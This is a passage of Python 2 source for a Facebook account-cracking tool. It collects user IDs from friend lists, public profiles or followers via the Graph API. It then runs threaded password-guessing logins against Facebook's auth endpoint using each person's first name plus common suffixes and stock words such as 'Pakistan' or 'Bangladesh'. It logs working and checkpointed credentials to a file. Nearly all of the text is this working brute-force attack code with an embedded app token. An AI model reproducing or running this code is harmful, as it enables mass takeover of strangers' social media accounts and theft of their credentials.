													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'Pakistan'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass6 + '\033[1;91m>\033[1;97m' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass6 + '\033[1;91m>\033[1;97m' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = '786786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass7 + '\033[1;91m>\033[1;97m' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass7 + '\033[1;91m>\033[1;97m' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)

											                              
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print '\033[1;96m[\033[1;97mok\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/Techabm.txt")
	print("\033[1;97m--------------------------------------------------")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()

def kuper():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo2
	os.system('clear')
	print logo
	print("\033[1;97m--------------------------------------------------")
	jalan( "\x1b[1;32;92m[1]\033[1;33;98m>\033[1;91mCrack From Friendlist ID ") 
	jalan( "\x1b[1;32;92m[2]\033[1;33;98m>\033[1;91mCrack From Any Public ID") 
	jalan( "\x1b[1;32;36m[0]\033[1;33;96m>\033[1;94mBack") 
	print("\033[1;97m--------------------------------------------------")
	pilih_kuper()

def pilih_kuper():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_kuper()
	elif peak =="1":
		os.system('clear')
		print logo
		print("\033[1;97m--------------------------------------------------")
		jalan('\033[1;96m[+] \033[1;93mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print("\033[1;97m--------------------------------------------------")
		idt = raw_input("\033[1;96m[  ok]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[  ok] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[  ok] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			kuper()
		print"\033[1;35;37m[  ok] Getting ID"
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_kuper()

	
	print "\033[1;36;96m[  ok] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[  ok] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		    print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  >-------\x1b[1;91m  To Stop Process Press CTRL+Z  \033[1;97m------>"
	print "\033[1;97m >------------------------------------------------>"
	jalan('  \033[1;93m  Plz Wait Cloned Accounts Will Appear Here')
	jalan('  \033[1;93m              Crack Bangladesh ')
        print "\033[1;97m >------------------------------------------------>"
	
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass1 + '\033[1;91m>\033[1;97m' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass1 + '\033[1;91m>\033[1;97m' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass2 + '\033[1;91m>\033[1;97m' + b['_name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass2 + '\033[1;91m>\033[1;97m' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass3 + '\033[1;91m>\033[1;97m' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass3 + '\033[1;91m>\033[1;97m' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass4 + '\033[1;91m>\033[1;97m' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass4 + '\033[1;91m>\033[1;97m' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12' 
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass5 + '\033[1;91m>\033[1;97m' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass5 + '\033[1;91m>\033[1;97m' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'Bangladesh'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass6 + '\033[1;91m>\033[1;97m' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass6 + '\033[1;91m>\033[1;97m' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Bangladesh123' 
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass7 + '\033[1;91m>\033[1;97m' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass7 + '\033[1;91m>\033[1;97m' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)

											                              
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print '\033[1;96m[\033[1;97mok\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/Techabm.txt")
	print("\033[1;97m--------------------------------------------------")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def indoo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo2
	os.system('clear')
	print logo
	print("\033[1;97m--------------------------------------------------")
	jalan( "\x1b[1;32;92m[1]\033[1;33;98m>\033[1;92mCrack From Friendlist ID ") 
	jalan( "\x1b[1;32;92m[2]\033[1;33;98m>\033[1;92mCrack From Any Public ID") 
	jalan( "\x1b[1;32;36m[0]\033[1;33;96m>\033[1;91mBack") 
	print("\033[1;97m--------------------------------------------------")
	pilih_indoo()

def pilih_indoo():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_indoo()
	elif peak =="1":
		os.system('clear')
		print logo
		print("\033[1;97m--------------------------------------------------")
		jalan('\033[1;96m[+] \033[1;93mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print("\033[1;97m--------------------------------------------------")
		idt = raw_input("\033[1;96m[  ok]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[  ok] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[  ok] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			indoo()
		print"\033[1;35;37m[  ok] Getting ID"
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_indoo()

	
	print "\033[1;36;96m[  ok] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[  ok] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		    print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  >-------\x1b[1;91m  To Stop Process Press CTRL+Z  \033[1;97m------>"
	print "\033[1;97m >------------------------------------------------>"
	jalan('  \033[1;93m  Plz Wait Cloned Accounts Will Appear Here')
	jalan('  \033[1;93m              Crack Pakistan ')
        print "\033[1;97m >------------------------------------------------>"
	
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass1 + '\033[1;91m>\033[1;97m' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass1 + '\033[1;91m>\033[1;97m' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass2 + '\033[1;91m>\033[1;97m' + b['_name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass2 + '\033[1;91m>\033[1;97m' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass3 + '\033[1;91m>\033[1;97m' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass3 + '\033[1;91m>\033[1;97m' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass4 + '\033[1;91m>\033[1;97m' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass4 + '\033[1;91m>\033[1;97m' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12' 
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass5 + '\033[1;91m>\033[1;97m' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass5 + '\033[1;91m>\033[1;97m' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'Sayang'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass6 + '\033[1;91m>\033[1;97m' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass6 + '\033[1;91m>\033[1;97m' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Kontol'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass7 + '\033[1;91m>\033[1;97m' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass7 + '\033[1;91m>\033[1;97m' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)

											                              
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print '\033[1;96m[\033[1;97mok\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/Techabm.txt")
	print("\033[1;97m--------------------------------------------------")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def follow():
	toket=open('login.txt','r').read()
	os.system('clear')
	print logo
	print 50*"\033[1;97m-"
	idt = raw_input("\033[1;97m[\033[1;95m    \033[1;97m] \033[1;97mID Public/Friends \033[1;91m:\033[1;92m ")
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;97m[\033[1;95m>\033[1;97m] \033[1;97mName \033[1;91m:\033[1;92m "+op["name"]
	except KeyError:
		print"\033[1;97m[\033[1;91m!\033[1;97m] ID public/friends does not exist !"
		raw_input("\n\033[1;97mBack To Menu")
		menu()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[\033[1;91m!\033[1;97m] No connection !"
		keluar()
	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+toket)
	z = json.loads(r.text)
	for i in z['data']:
		id.append(i['id'])
		
	print "\033[1;94m[\033[1;92m+\033[1;97m] Total Followers \033[1;91m: \033[1;97m"+str(len(id))
	print("\033[1;94m[\033[1;92mok\033[1;97m] Cracking Process Has Been Started ...")
	print 50*"\033[1;97m-"
	
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass1 + '\033[1;91m>\033[1;97m' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass1 + '\033[1;91m>\033[1;97m' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass2 + '\033[1;91m>\033[1;97m' + b['_name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass2 + '\033[1;91m>\033[1;97m' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass3 + '\033[1;91m>\033[1;97m' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass3 + '\033[1;91m>\033[1;97m' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass4 + '\033[1;91m>\033[1;97m' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass4 + '\033[1;91m>\033[1;97m' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12' 
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass5 + '\033[1;91m>\033[1;97m' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass5 + '\033[1;91m>\033[1;97m' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + '007' 
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass6 + '\033[1;91m>\033[1;97m' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass6 + '\033[1;91m>\033[1;97m' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = b['first_name'] + '@123' 
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
